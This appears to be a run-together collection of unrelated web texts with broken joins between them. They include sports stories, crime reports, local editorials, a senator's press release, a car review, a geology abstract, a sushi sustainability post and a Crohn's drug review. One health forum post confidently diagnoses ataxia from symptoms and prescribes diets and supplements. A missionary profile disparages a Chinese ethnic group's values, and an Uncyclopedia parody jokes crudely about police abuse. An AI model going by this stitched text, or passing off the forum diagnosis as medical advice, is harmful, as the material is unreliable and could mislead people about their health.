"For about 60 years we had position limits. In the 1990s, they were removed from a lot of commodities. Now, with crude, there are only position accountability limits three days before the contract is up. We need them again. We need to go back to that regulatory regime that worked for 60 years.
"Bottom line, the commodities market really just boils down to inventory. If you want to invest in energy, buy energy companies, exploration partnerships, or alternative energy companies — don't buy the inventory itself," he said.
More on Proposed CFTC Regulations:
- Speculators Were Key in Oil Price Hike: Chilton
To make his case, Masters makes a simple analogy: instead of investors trying to buy up all the tickets to Disneyworld (inventories to be sold by Disney) as an investment, wouldn't it make more sense that investors buy the common stock in Disney Corporation (means of production)?
In preparing for his Congressional testimony, Masters found data he said shows that markets are being primarily driven by capital markets investors versus the designated prime constituency: bona fide hedgers.By Ed Tait

So let’s do this once and move on, shall we?
From the already-tired-storyline department, it was former Coyotes-turned-Philadelphia Flyers goaltender Ilya Bryzgalov who came to the MTSCentre versus new Jets; Jets 1.0 vs. Jets 2.0 — is now upon us.

The shipping industry could be an important growth driver because it not only provides good jobs, but its positive impact radiates to other sectors, from retail to manufacturing to real estate.
New scheduled cargo flights from Hong Kong by shipper Cargolux, starting this week, are a very positive sign for Rickenbacker Airport and the Columbus Regional Airport Authority, and for the overall development of logistics in central Ohio.
The new twice-weekly flights, unlike ongoing twice-weekly ones by Kalitta Air, are scheduled rather than chartered — meaning the cargo airline is assuming some risk rather than having the flights paid for entirely upfront by those using its services. This presents an opportunity for the airport authority to find other users to join Victoria’s Secret parent L Brands and other locally headquartered retailers who will be customers from the outset.
The flights also will help the airport’s bottom line. Rickenbacker has lost money for years, though its loss has been narrowing under the airport authority’s management. The authority has worked hard to respond to industry changes that often are beyond its control.
Combined with the added truck and rail activity around Rickenbacker, these flights continue to build Rickenbacker’s stature as an intermodal shipping hub. That means economic benefits and jobs to all of central Ohio.
Learning shouldn’t stop during summer break
Now that school is out, it’s time for the kids to really hit the books. Local libraries this month are starting up their free summer reading clubs, which offer nifty prizes for reading even a few minutes a week.
But the real reward for reading a book is the joy and discovery that leap from its pages. People can get lost in a book, or find themselves in one. And they’re handy for when little ones complain they’re bored.
“Books are great companions; you are never lonely when you have a book to read,” says the National Children’s Book and Literacy Alliance.
Reading also develops imagination, allows people to share cultural experiences and lets kids vicariously try out experiences before having to navigate the world on their own. Importantly, summer reading also keeps children on track in their education.
“The studies I’ve seen show that a child can fall behind as much as a grade level if they don’t keep up with reading while school’s out,” Grove City librarian Lore Lehr recently told ThisWeek Community News. “It’s called the summer slide.”
National studies show that about 1 out of 3 children never or rarely visits a local library in a typical year. It’s up to an adult to get them there and expose them to new worlds: from exploring the American frontier with Laura Ingalls Wilder to embarking on a friendship with a pig named Wilbur and a spider named Charlotte.

Share the post "Chavez Jr. agrees to $1 million weight penalty for Golovkin fight on July 19th"
By Dan Ambrose: Former WBC middleweight champion Julio Cesar Chavez Jr. (48-1-1, 32 KO’s) showed how badly he wants a big pay per view fight against WBA middleweight champion Gennady Golovkin (29-0, 26 KO’s), because he’s agreed to a big $1 million weight penalty for the July 19th fight. The bout will be taking place at 168lbs, and Golovkin’s promoter Tom Loeffler of K2 Promotions wanted the weight penalty in case Chavez Jr. came in over weight like he did in his first fight against Brian Vera last year. That’s the fight that eventually took place at 173lbs due to Chavez Jr. being too heavy to make the normal super middleweight limit.
Losing $1 million of his purse would be a huge blow to Chavez Jr., but he’ll still do really well because this fight is going to be on HBO PPV and it’s likely to bring in huge numbers. I just hope that Chavez Jr. doesn’t blow off the weight knowing that he’ll still wind up making another $4 million+ for the fight.
Both Chavez Jr. and Golovkin will be subject to the $1 million weight penalty, but it’s no big deal for Golovkin because he’s moving up in weight from 160 for this fight, and he’s never had problems making weight before. He stays in shape year round, and doesn’t overload with carbohydrates and fattening foods in between fights.
Chavez Jr’s promoter Bob Arum of Top Rank is confident that the Mexican star will make the weight, so he readily agreed to it. Arum feels that Chavez Jr. will be able to make the weight because he made it earlier this month in the rematch against the much lighter Brian Vera on March 1st.
“We had no objection,” Arum said to ESPN. “It goes for both guys. We know there has been a history with Chavez. But he has no problems making 168 now. He made it with ease for the Vera rematch. He wasn’t dehydrated on the scale. He wanted to prove to everybody that when he does the weight right, he can get down to 168 without any problem.”
Team Golovkin should have pushed for a rehydration limit to keep Chavez Jr. from ballooning over 190+ once he makes weight. Golovkin weighs around 170lbs after rehydrating for his fights at middleweight, but it’s a much different story for the 28-year-old Chavez Jr. He looks like a cruiserweight after rehydrates, and I can’t see any difference between him and some of the cruiserweights like Marco Huck. What Golovkin doesn’t need is to be out-weighed by over 20lbs by Chavez Jr. on July 19th.
I think if you put Chavez Jr. in the ring with a cruiserweight after he rehydrated, he’d look right at home with guys his own size. I still don’t understand why Chavez Jr. doesn’t want to move up to the cruiserweight division to fight guys his own size. But I guess being much heavier than his super middleweight opponents gives Chavez Jr. an advantage that he doesn’t want to take away.
The fight was originally supposed to be taking place on July 12th, but they moved it to July 19th due to a World Cup soccer match that will be televised on July 12th on Box Axteca in Mexico, and Chavez Jr. doesn’t want to be competing with that.
Arum will have another one of his Top Rank cards on July 19th, this one in Macao, China, and will be headlined by two-time Chinese Olympic gold medalist Zou Shiming. The card will also have WBA/WBO super bantamweight champion Guillermo Rigondeaux making a title defense. The card will be televised on HBO2 during the afternoon so that U.S fans can see this fight cards during the day, and then tune in for the PPV fight between Chavez Jr. and Golovkin during the evening.
Golovkin doesn’t want to stay at 168 after he beats Chavez Jr on July 19th. This is strictly just a one off type thing. He just wants to whip Chavez Jr., and then move back down to 160. 2011

A woman was kidnapped at gunpoint in Del Paso Heights and then sexually assaulted by an unknown assailant Wednesday evening, according to Sacramento police.
The woman was getting into her parked car on the 800 block of Grand Avenue shortly before 6 p.m. when a stranger approached her, said police Sgt. Norm Leong.
The man pointed a gun at the woman and ordered her to move into the passenger seat, Leong said. He then drove her to an undisclosed location and sexually assaulted her, Leong said.
The man then fled on foot, Leong said.
The victim described the man to police as black and in his late 20s or early 30s, Leong said. She said her assailant weighed about 250 pounds and wore dark clothing.
Anyone with information about this assault is asked to call Crime Alert at (916) 443-HELP.Another setback for Rose, and maybe, another long comeback
The news could've been worse, which is something we always say when terrible things happen to other people. The news Saturday was that Derrick Rose, who missed more than 500 days of competitive basketball because of a knee injury, will miss more time with another one.
It was a different injury to the other knee -- a torn meniscus in his right knee this time after Rose missed the entire 2012-13 season while recovering from a torn ACL in his left. Left, right, meniscus, ligament -- it didn't matter. This was another terrible blow for one of the NBA's purest, most dedicated superstars.
"Awful," was the only word one person close to Rose could muster in a text-message exchange late Saturday.
And I couldn't agree more. After all that Rose endured to get his body and game back in MVP form, this was a terrible setback.
The most important question here is which direction Rose decides to go with the arthroscopic surgery that will address the tear to his medial meniscus -- the shock absorber that encircles the knee joint on the interior side of the knee. A repair of the meniscus is ideal from a long-term standpoint, since the cushion will remain intact to prevent bone-on-bone contact, but requires a longer recovery -- approximately six months, which would jeopardize the rest of Rose's season. Depending on how badly the meniscus is damaged, and how much of it is damaged, repair may not be possible.
Removal of the meniscus makes for a quicker recovery -- as short as a few days, as in the case of Metta World Peace last season -- but is not the ideal long-term solution. This is especially true for a 25-year-old professional athlete who makes a living with his legs. The Bulls, their medical staff, Rose, and his representatives were still exploring all the options Saturday night and trying to determine the correct course of action, league sources told CBSSports.com.
When Russell Westbrook of the Thunder suffered a torn lateral meniscus (on the outside of the knee) during last season's playoffs, the Thunder, Westbrook and his representatives decided to go with the long-term solution of repairing it. Westbrook missed six months. He required a cleanup procedure on Oct. 1 to deal with swelling from a loose stitch, but returned weeks earlier than projected.
Given the grueling rehab he went through on his left knee and his deliberate approach to returning to the court, it is difficult to imagine Rose going for a quick fix this time. One thing the Bulls can -- and probably will -- do differently is specify a timeline for his recovery once it is decided whether to repair or remove the meniscus. The last thing Rose and the Bulls need now is another months-long soap opera over when he is coming back.
Rose's return this season was widely chronicled as the important event that it was, including by yours truly here and here. There are never any guarantees, and a comment from ACL survivor Jamal Crawford is haunting when you read it now: "The leg that you had surgery on is probably stronger than the leg that you didn't have surgery on."
Rose's right knee buckled on Friday night when he planted while in defensive pursuit in a 98-95 loss in Portland. As a footnote, this was Rose's first game at the Rose Garden since February 2011 -- due, in part, to the lockout-shortened 2011-12 season but also to his long absence while coming back from the left ACL tear he suffered in the first game of the 2012 playoffs against Philadelphia.
So with all that passes for news in today's NBA -- who's mad at whom, who wants to team up with whom, who wants to be traded, who's getting hired and fired, you can stab me with a fork any time -- this news on Derrick Rose cuts right to the heart of what athletic competition is about. Rose is not flashy, draws no attention to himself, asks for no sympathy and does not seek the spotlight. He just works seriously at his craft, tries to be a good teammate, plays the game with maximal effort all the time and is a joy to watch.
Once again, we'll be robbed of that joy as Rose deals with another knee injury, and the potential for another long recovery. But let's not forget that our own diminished enjoyment is nothing compared to what he's going through right now.
I'm not sure whether it's appropriate to wish Rose a speedy recovery, since in this case, fast may not necessarily mean best. However long it takes, though, I wish him a successful one.You currently have javascript disabled. Several functions may not work. Please re-enable javascript to access full functionality.

The technical name for dizziness or lightheadedness immediately on standing is orthostatic hypotension. (When you stand up quickly, the body doesn't adjust blood pressure quickly enough and your brain literally gets too little blood for a short period of time.)Many things contribute to it, so investigating underlying conditions/states is good. Vitamin deficiencies, vascular problems, or just straight dehydration can contribute. But know that it is not unusual for nothing to be really wrong and some people are simply more likely to experience this. (I'm one of them.)

These are symptoms of ataxia, dear. It's a neurological condition that goes along with celiac. Cheer up, once you stick to the diet strictly, it starts to go away, as long as you are careful and diligent, and secondly, it's the best motivator I've ever had to stay on a gluten free diet. Sometimes this means we are really sensitive to cross contamination, so you may want to start your journey by avoiding as much processed food as possible. And DO supplement with those gluten free B complex vitamins (which you can find in most stores) ! "Normal" people may not need them, but we do. Nutritionists may try to tell you to eat like a typical person, but gluten free.... which will include a lot of cereal and grain products, some of us just cannot do that, at all, because we do not react to carbohydrates the same way, so be wary if you sub in the usual gluten free versions of processed foods and don't improve.Also, most of us start out by being lactose intolerant, because the part of the intestine damaged by the auto immune reaction is also the part which works to digest milk. This means that you may only be able to handle non lactose dairy products (properly processed high quality yogurt, or aged cheese, or butter) at first, or you may have to temporarily skip dairy for a while, then add the non lactose versions in later, and see if you can tolerate it. You know the current "low- fat" diet craze that claims milk fat leads to obesity ? This actually does not work for us, because skim milk has a lot of the lactose (milk sugar) and the high fat cream, which butter is made out of, does not. There is another subset of people who cannot handle any dairy, at all, because they are reacting to the cow milk protein, casein, so they end up using dairy substitutes. The third common culprit that a lot of celiacs react to is soy flour and soy proteins (sometimes trace soy oil is tolerable). I am putting this information out there now, so you will be aware of what your options are for further adjusting your diet. Also, hold off on gluten free oats until you get the rest of it under control, some of us react to them anyway, and it's best that they not be introduced and tested at first, so you can see what your reaction is, when you are healthier.Are you taking any over the counter forms of acid reflux inhibitors ? That made it worse for me, oddly enough.

Although they are officially (and ethnically) considered part of the Yao nationality, the Kiong Nai speak a language related to Miao. Kiong Nai is the selfname of this small tribe. The Chinese call them Hualan Yao which means "flowery blue Yao." It can also mean "Yao with baskets of flowers."
History
The Kiong Nai live alongside the Iu Mien and Lakkia in the Dayaoshan Mountains. These groups migrated into the area at different times. The Kiong Nai's homes are "built with brick and wood. ... The Pan [Iu Mien] and Shanzi Yao [Kim Mun], however, had no land in the Dayaoshan, suggesting that these two groups were later arrivals in the area. They had to ask to use land from the three established Yao groups, and had to pay rent and render manual labor to them. These two groups could not settle down, but lived in rustic bamboo sheds."
Customs
Kiong Nai women wear beautiful dress, which is "embroidered with fine lace and consists of three wraps, one large, one smaller, and one a medium size. ... A small bamboo basket is carried on the back and a long knife at the waist. A pair of short pants and a puttee completes the outfit." The Kiong Nai are renowned throughout the area for their skill in making silver ornaments.
Religion
The Kiong Nai are polytheists. They worship a variety of gods and spirits. Their religion has made them indifferent to the sanctity of human life. "It is their custom ... to control the size of their population. They plan their families according to their wealth and the size of the land they will till. Generally, there will be one or two children in a family. In order to maintain their living standard, they do not hesitate to resort to abortion if and when their planning goes wrong."
Christianity
The Kiong Nai are completely untouched by the gospel. They have never had a known believer or Christian fellowship among them. There are geographic, cultural, and linguistic barriers that prevent the Kiong Nai from hearing the message of salvation from other people groups.This forum is for discussion of runelore and related subjects, such as the mythology, history, culture and languages of the people who used the runes of northern Europe.

It's time for your Preds and Wild "Leftgovers"...Three outs, that is, to end an inning. And the Bucs had trouble nailing that third out in losing 3-2 to the Phillies this afternoon.
Tuffy Gosewisch rolled a single past the infield, scoring two runs with two outs in the ninth off Chris Leroux to win it. Ben Francisco and Pete Orr started the inning with back-to-back bunt singles against an all minor league infield (Jeremy Farrell - Jordy Mercer - Josh Harrison - Josh Fields) to prime Gosewisch's game-winning bleeder.
To add injury to insult, Brad Lincoln was yanked after taking a shot off the right arm from the bat of Jimmy Rollins. He got the out, and then exited with what appeared to be nothing more than a deep bruise. The team will find out tomorrow if it's anything more serious.
Lincoln worked 2-2/3 innings and allowed one run on one hit and a costly free pass. A leadoff walk followed by a bunt and Rollin's ball move Michael Martinez to third, and he scored with two outs when Shane Victorino greeted cold reliever Chris Resop with a double.
The Pirates scored two runs in the third off Roy Oswalt when Corey Wimberly grounded home a run and John Bowker followed with an RBI double, chasing home Josh Rodriguez and Lincoln. Jose Veras and Mike Crotta tossed three scoreless frames to hold the Bucco lead into the ninth.

Kim and Drack tied atop Girls Division
ROME, Ga. — Sean Kelly of Staten Island, N.Y., cut a stroke off his first-round score and carded a second-round 4-under-par 67 to join Payne Denman of Riverwatch, Tenn., at the top of the Boys Division at 7-under-par 135. Kelly Drack of Melbourne, Fla., and Alice Kim of Honolulu, both sit in the clubhouse through two rounds at even-par 142 and are tied for first place
Conducted by the American Junior Golf Association, the Burgett H. Mooney, Jr. Rome Classic is a 54-hole stroke play event being held at Coosa Country Club in Rome, Ga. The tournament field consists of 75 boys and 24 girls, ages 12-18, from 19 states and Canada. The Boys Division is playing the par-71 Coosa Country Club course at 6,821 yards, and the Girls Division is playing at 6,030 yards.
Kelly's bogey-free round included twelve straight pars on Nos. 4 through 15, sandwiched by two birdies on each side. His approach to this success is simple.
“I really hit a lot of greens,” Kelly said. “I think I hit 16 yesterday and 15 today — and no bogeys (today).”
Denman, on the other hand, had more of a back-and-forth round Wednesday, as he marked five birdies and three bogeys. Starting later in the morning than in the first round, he definitely noticed a difference regarding the weather.
“The wind started kicking up a little more out there today,” Denman said after shooting a second-round 2-under-par 69. “There were a few times where the tee shot got away, but I was able to scramble well,”
Bryan Lichimo of North Vancouver, British Columbia and Adam Schenk of Vincennes, Ind., both sit tied for third place at 5-under-par 137. Sawyer Shaw of West Palm Beach, Fla., and Ian Phillips of Acworth, Ga., follow closely at 4-under-par 138 and are tied for fifth.
In the Girls Division, Drack recorded 15 pars en route to a second-round 1-over-par 72, but knows she left some strokes on the course.
“Off the tee I was hitting okay, and my approach shots were good for the most part. My putting was kind of average,” Drack said. “ I had a lot of opportunities that I missed but I'm happy about it (being in the lead).”
Meanwhile, Kim finished her second round by going 2-under-par on Nos. 15 through 18. Her three birdies during that stretch allowed her to finish at 1-under-par 70 for the day.
“My drives were really bad but my irons were good,” Kim said. “I got very close to the hole and my long putts also went in.”
Following closely behind in third at 1-over-par 143 is Ashlan Ramsey of Augusta, Burgett H. Mooney, Jr. Rome Classic will run from 7:30 a.m.-12:50 p.m. off the No.1 tee at Coosa Country Club. For more information, please call.Paul E. Kandarian

Edward Jones is a huge financial company based in St. Louis – with more than 10,000 offices nationwide – and a small presence in Rhode Island at a dozen offices. The key to employee satisfaction? Flexibility, according to Steven M. Plante of the Edward Jones East Greenwich office.
“That’s the main thing, the flexibility,” said Plante, who had always wanted to run his own business when he met another Edward Jones adviser, who filled him in on what it’s like to work for the firm. “I can come and go as I please. I’m not on salary. I don’t have vacation time. And I accept that. Some days I leave early, some days I work until 7 p.m. And it’s the same for the people in my office.”
Other key benefits for working for Edward Jones include profit sharing, with the company annually sharing 24 percent of net profits, some $94 million last year, with all associates employed six months or more who work a minimum of 20 hours a week. Over the past decade, profit sharing averaged a 4 percent annual pay increase. All associates are also eligible for limited partnership, with nearly 15,000 associates enjoying the unique perk, including Plante.
The company’s high-deductible medical plan ($6,150 for a family) includes free preventive care with eligible medical expenses and prescription drugs covered 100 percent, once the deductible is met. Company officials said the high deductible is the most chosen by associates because it limits their total out-of-pocket exposure.
An intangible but valuable part of working there, Plante said, “is right from the top, the company has soul. Doing what’s right for the client transcends right down through the organization. … The home office [does] a phenomenal job of supporting us and helping our clients.” •Development

From Uncyclopedia, the content-free encyclopedia
Sometimes Police work can be a real drag.
“I ain't the one for a punk motherfucker with a badge and a gun...”
Fuck the Police is an online dating website designed specifically to match people with members of the Police Services. The site claims many thousands of members, stating that many new policemen and women are joining every day. Just like the Freemasons.
The site was set up following the huge number of reports of Police Officers picking up sexual partners through driving round rough areas and picking up individuals in their vehicles, as a more low key method that is less likely to see your name mentioned in the Daily Mail.
General advice on dating a police officer
Putting up a profile on any dating site is like having a resume, but one where people will constantly be thinking about the size of your truncheon and how banged up they are going to get after being taken into "Police Custody".
Dating a policeman or policewoman has its challenges. The demands of a career dedicated to legalised abuse may reward you with numerous backhanders, but challenges to your social life remain. Shift work in the station means it can be difficult to find the time needed to spend arranging a date let alone maintaining a romantic relationship. Searches should be based on profession as well as outside interests.
If you're a police officer looking for love, Fuck the Police attempts to provide a straightforward method of finding other members of local forces desperate for a rogering. However for people who want something completely different, the system can help to connect members with people who want to date someone in the police, someone who understands that the uniform brings a whole lifestyle and set of commitments with it, and will still drop them for anyone in a uniform and a nice helmet.
Police brutality
We all from time to time enjoy the wanton use of excessive force, if not physically then in the form of verbal attacks and psychological intimidation, but it is important to remember the stresses placed on a relationship when asking members of Police Forces to effectively bring their work home with them.
Communication is good in any relationship, and understanding that having spent the day "smashing someone's backdoors in" some Police Officers would prefer to wind down with slippers and a pipe and a couple of episodes of "Come Dine With Me" rather than engaging in further brutality.
Advertising campaigns
The Fuck the Police advertising campaign focused on the gritty realism of the streets.
The website is famed for its unique approach to advertising, utilising a guerrilla advertising approach which features the title "Fuck the Police" spray-painted in prominent locations worldwide. Regional alternatives were used, such as "Fuck da Polis" for the Glaswegian and lowland Scottish campaign.
Criticism
A number of groups including Religious Organisations and Rightwing Groups have questioned the moral grounds of the thinking behind the site, which in their opinion sexualises those in Police uniforms and does not value them as individuals. They propose changing the focus of the site to maybe taking the Police out for a meal, to a theater or to watch a movie, get to know the Police and commit to a relationship before turning to forn)}" >Looking for a Used DeVille in your area?

2004 Cadillac DeVille Overview
Overall User Score
Based on 10 reviews
The full-size DeVille sedan receives a number of upgrades for 2004. New additions include heated and cooled front seats paired with a heated steering wheel and an electronic parking-brake release. The base trim will now offer Cadillac's Night Vision visibility feature as an option, and an armor-clad version of the sedan is now available in either standard or stretched wheelbase versions.
The DeVille continues to earn praise for its smooth and powerful Northstar V8 mill, a feature enhanced by the sedan's surprisingly nimble handling abilities. Inside, the DeVille's expansive cabin offers plush and inviting seating and well-placed controls. Ergonomics include a very user-friendly navigation system. However, while the DeVille name certainly offers longevity, its dated styling and lower-quality interior materials drop it a tier below the other offerings in this segment.
The sedan enters its second-to-last year of production in 2004, with Cadillac planning to discontinue the DeVille after 2005. For now, the DeVille is split into three trim levels: Base, DHS, and DTS. The Base model offers the expected Cadillac amenities, while the two upper level trims each have a niche. The DHS is an abbreviation for "DeVille High Luxury Sedan," and the DTS is the "DeVille Touring Sedan." The DHS has unique upscale features, like heated/massaging rear seats and a rear sunshade, while the DTS is differentiated by performance enhancements like stability control, an active suspension, and magnetic variable-assist steering.
GM's OnStar assistance and a tire-pressure monitor are standard on all trims, while rear-obstacle detection, satellite radio, and a navigation system are optional across the board. The navigation system utilizes voice-recognition technology and will play DVDs on the dashboard screen when the vehicle is stationary.
There are two engine options in the DeVille lineup. The Base and DHS house a 4.6-liter V8 that produces 275 horsepower, while the DHS gets an enhanced version of this engine, good for 300 horsepower. Both powerplants are mated to a four-speed automatic transmission. Fuel economy is reasonable for such a large car, with an EPA estimate of 17/26 mpg.

What's your take on the 2004 Cadillac DeVille?
pmartin1664 Hello Gentleman and any Ladies, I bought my 2004 Deville DHS about 3 months ago. I got a great deal on it, although it was bought with the knowledge that the vehicle had rough spot while idleing and when starting off from a stop, it seems to choch and sputter. Once it gets to about 15-20 mph it seems to run fine. I had part replaced when I had the problem checked out. For the life of me I can't find the receipt for the part replaced. However, it was about $300 with labor, and it was fuel module. The problem seemed for a quick moment to improve. But in actuality, it's getting worse. The check engine light stays on and then flahes when the sputter is worse. But of course, I'm guessing at that! Any idea's as to what in the world is going on? My biggest problem is funds, like most folks. I've been laid off now 2 months, with no better times in sight. I say this as I don't have the monies to replace item after item, and get no results. Your expertise will go along way in reducing the stress I have with this issue. Thank you all so much!Research on genesis of pyrite near the Permian-Triassic boundary in meishan, Zhejiang, China

AbstractThe at the uppermost part of the Changxing Formation in the Meishan section may be related to volcanic activity. In bed 24e2 of the Meishan section, pyrite has its highest content of 1.84% and the sulfur isotope composition has the highest ??34S value at + 2.2??? which is very similar to that of the average value of volcanic gas. There are some volcanic products such as ??-quartz, siliceous cylinders and siliceous spherules which coexisted with pyrites in beds 24e2 and 24f. It can be concluded that a large quantity of volcanic ash fell into the South China Sea and was incorporated into marine sediments during the formation of limestone at the uppermost part of the Changxing Formation. The volcanic eruption with massive amounts of H2S and S02 gas at the end of the Permian period resulted in the enrichment of H2S in the South China Sea areas. The reaction of H2S with reactive iron minerals formed the mass of abundant pyrites.

WASHINGTON, D.C. – Senator Lisa Murkowski today reached out to Chairman of the Joint Chiefs of Staff Martin Dempsey regarding the U.S. Air Force proposal to move the F-16 Aggressor squadron – within days of him testifying he will become personally involved – outlining the many flaws and incorrect presumptions contained within the plan. Murkowski also informed him that she supports the ideas laid out in a recent letter to the Pentagon from Senate Armed Services Committee Chairman Senator Carl Levin (D-MI) that would halt implementation of any U.S. Air Force proposed force structure changes during FY2013.
Murkowski writes, “Subsequent to our conversation last week, I learned that Chairman Levin had written [United States Air Force Chief of Staff] General Schwartz to urge in the strongest possible terms that the Air Force not implement any of its proposed force structure changes until the beginning of Fiscal Year 2014 at the earliest in order to … to review a study on the future structure of the Air Force.”
In addition to her support for Levin’s proposal, Senator Murkowski laid out her reasoning for opposing the F-16 Aggressor Squadron transfer, “As each day passes it becomes clearer to me that the Air Force’s decision to move the F-16 Aggressor Squadron away from Eielson Air Force Base in 2013 was the first step in a poorly conceived plan to force the downsizing of the base in 2015 – a plan disturbingly similar to that rejected by the 2005 BRAC Commission.”
Murkowski also pointed out the financial implications of the proposal, in addition to the impact such a move could have on school districts in the Fairbanks North Star Borough as well as the Anchorage and Mat-Su areas.
Murkowski concludes by sharing with General Dempsey that the proposal will not save money but cost millions in FY13. “The Air Force now concedes that implementation of this move will cost the taxpayers at least $5.65M in unprogrammed cost in FY13 and it should be obvious why the Air Force should abandon its hastily conceived plans for Eielson Air Force Base at the present time.”
Murkowski will meet with Dr. Dorothy Robyn, Deputy Undersecretary of Defense for Installations and Environment tomorrow to discuss the Defense Department’s the Air Force planned force structure changes.
The letter to Chairman of the Joint Chiefs of Staff Gen. Dempsey is attached.Deputies Nab Duo Suspected In String Of Valencia-Area Vehicle Robberies

SANTA CLARITA (CBSLA.com) — Santa Clarita detectives have announced the arrest of two men they say are responsible for a string of vehicle robberies in the Valencia area.
Andrew Khachatourian (of Valencia) and Chase Garcia (of Saugus) were arrested Thursday after a man called police to tell them two men were walking through his neighborhood looking suspicious in the early-morning hours.
After the suspects were detained, they were found to be in possession of stolen property, according to LA County Sheriff’s.
A follow-up investigation said the men were in possession of a variety of items taken from cars, including electronic equipment, phones, lap tops and sunglasses.
The items were valued into the thousands of dollars.
Officials said both men had prior criminal records.

Anyone who thinks spin classes are a killer workout should try Web Crowell’s regimen: Every Sunday and Monday, rain or shine, the Capitol Hill resident puts roughly three hundred pounds of homemade bottled seltzer water on the back of his bike and delivers it to Seattleites who enjoy a bit of the bubbly.
A stop-motion animator, Crowell, 40, founded Under Pressure Seltzer Works (seltzerup.com) last summer in an effort to revive the seltzer trade—which thrived during the midcentury in cities such as Boston, San Francisco and Seattle.
Just like milkmen of old, Crowell offers personalized beverage delivery (a case of four 32-ounce bottles for $10 or six for $15) and empty bottle pickup. Making use of a rented commercial kitchen and his own century-old carbonating machine, Crowell fills antique seltzer bottles (with valve tops that ensure freshness) and delivers them on the world’s first “Seltzerbike” to homes, private events and bars on Capitol Hill.
“The Hill is a test,” Crowell explains, “If things go well I’m interested in expanding.” Demand is already on the rise. Currently, Crowell delivers around twenty cases per week. While seltzer water may be less expensive in stores, Crowell’s artisanal product is equally bubbly and undeniably more sustainable—and comes with the added thrill of having a seltzerbike arrive at your doorstep.

While the consumer guides –- in print, online and mobile device versions -– differ in appearance, all are based on similar data, and offer one consistent message: Our sushi choices have an impact on the future of the ocean.
"The reality is quite simple," says Sheila Bowman, outreach manager for Seafood Watch. "If you care about the future of the oceans, you'll avoid red-listed sushi."
For sushi aficionados, that means both pleasant surprises, and some disappointments. The "red" list includes items like bluefin tuna (hon maguro/kuro maguro) and freshwater eel (unagi), along with farmed salmon (sake). These species are either overfished, farmed with aquaculture methods that pollute the ocean, or caught using methods that destroy ocean habitats or kill large amounts of other sea life.
Green-listed "Best Choices" include wild-caught Alaska salmon (sake), farmed scallops (hotate) and Pacific halibut (hirame), in part because they come from abundant, well-managed fisheries or -– in the case of scallops -– are raised using sustainable aquaculture methods.
Pocket guides will be available on our Seafood Watch website on October 22 -- a day when we hope you'll take part in a Sustainable Sushi Party at home or your local sushi restaurant. The good news is that every sushi restaurant offers some sustainable items.
(If you live in the San Francisco Bay Area, check out Tataki, currently the only 100% sustainable sushi restaurant we've found in North America. Casson Trenor, one of the folks behind Tataki, will publish a book about sustainable sushi in January 2009.)
In addition to our new Sushi Pocket Guide, we'll have other fun items for sustainable sushi advocates. I'll have more details in the next two weeks.
Wow, this sushi makes me hungry nice one.

Did. […]This review concluded that therapy with adalimumab or infliximab may have a beneficial effect compared with standard care on outcome measures for induction and maintenance therapy for Crohn's disease. Issues with the reliability of the trial evidence were documented by the authors and their conclusion rests on a well-conducted review and appears likely to be reliable.
To assess the effectiveness and cost-effectiveness of infliximab in adults and children with moderate to severe Crohn's disease who were refractory to or intolerant of conventional treatment and in adults with fistulising Crohn's disease, and to assess the effectiveness and cost-effectiveness of adalimumab in adults with moderate to severe Crohn's disease who were refractory to or intolerant of conventional treatment.
MEDLINE, EMBASE and Cochrane Central Register of Controlled Trials (CENTRAL) were searched up to June 2007. Research registries were searched, with conference abstracts from five relevant societies for 2006 and 2007. The search strategy was reported. Relevant websites including those of the European Medicines Agency and the US Food and Drug Administration were also searched; references of relevant studies were checked, experts were contacted and submissions from industry considered. There were no language restrictions.
Randomised controlled trials (RCTs) that enrolled adults aged at least 18 years or children aged six to 17 years with moderate to severe Crohn's disease who were refractory to or intolerant of conventional treatment were eligible for inclusion. Adults with fistulising or non-fistulising Crohn's disease were eligible. Moderate to severe disease was defined as reported by trial authors or having an average Crohn's Disease Activity Index (CDAI) of at least 220.
Trials were required to assess tumour necrosis factor-alpha (TNF-alpha) inhibitors (adalimumab or infliximab) at any dosage and on any regimen compared with conventional treatment without TNF-alpha inhibitors. Conventional treatment could include: no treatment; placebo; dietary interventions; pharmacotherapies such as aminosalicylates, methotrexate, corticosteroids, azathioprine, metronidazole; or surgical treatment. Trials that compared adalimumab and infliximab with each other were also eligible, as were those that compared different dosages or regimens of the same drug. At least one of the following outcomes had to be reported: overall survival; progression-free survival; quality of life; disease activity; need for surgery; hospitalisation; adverse effects. Trials of both induction and maintenance of remission were eligible.
All except two of the included trials compared adalimumab or infliximab with placebo; two trials of infliximab enrolled patients with fistulising disease and two trials were in paediatric patients (both dose-finding studies of infliximab and neither placebo controlled). All were multi-centre trials conducted mainly in North America or Europe. Exclusion criteria that related to previous or concomitant medications varied but most patients were receiving additional treatments.
Two reviewers independently assessed the studies for inclusion; disagreements were resolved by discussion or referred to a third reviewer.
Studies were appraised for quality using criteria based on Cochrane Collaboration guidelines. These comprised: randomisation, allocation concealment, blinding, follow-up, comparability of groups, use of intention-to-treat analysis, power calculation and selective reporting.
Quality was assessed by one reviewer and checked by a second. Discrepancies were resolved by discussion or referral to a third reviewer.
Data extraction was undertaken for risk differences (RD) or risk ratios (RR) with 95% confidence intervals (CI) or to permit the calculation of these for the outcomes of percentage response, response 70, response 100 and remission. Mean differences were calculated for the Crohn's Disease Activity Index and other continuous measures. Data extraction included the extraction of numerical information from graphs.
One reviewer performed the data extraction using a standardised data extraction form, and another reviewer checked it. Discrepancies were resolved through discussion with a third reviewer.
Due to clinical heterogeneity, the studies were combined in a narrative synthesis structured by the aims of therapy (induction or maintenance) and characteristics of patients (non-fistulising versus fistulising adult patients or paediatric patients).The effect of treatment dose and differences in study duration (range four to 56 weeks) were examined.
Eleven RCTs were included in the review. There were concerns about the quality of the trials, in particular those that assessed maintenance therapy. These centred on division of patients into responders and non-responders at different time points, high rates of scheduled cross-overs between treatment groups and unclear handling of data (including missing data). The use of responder only data in maintenance trials was a particular issue.
Adult patients with non-fistulising disease
In two induction trials between 6% and 24% more patients treated with adalimumab achieved remission compared with placebo; in one infliximab trial between 21% and 44% more patients achieved remission. In maintenance trials benefits of between 24% and 29% more patients achieved remission for adalimumab (two trials) and between 14% and 24% for infliximab (two trials). These results were based on changes in the Crohn's Disease Activity Index and reflected results across a range of doses.
Adult patients with fistulising disease
One induction trial showed that between 29% and 42% more patients achieved a 50% reduction in fistulas compared with placebo; 23% more patients in a maintenance trial achieved this reduction compared with placebo. Subgroup results from two additional RCTs provided contradictory indications as to whether adalimumab conferred any benefit.
Children
It appeared likely that infliximab therapy for children offered a benefit of increased remission but the lack of a placebo group in either the induction or the maintenance trial made this difficult to determine.
Adverse events
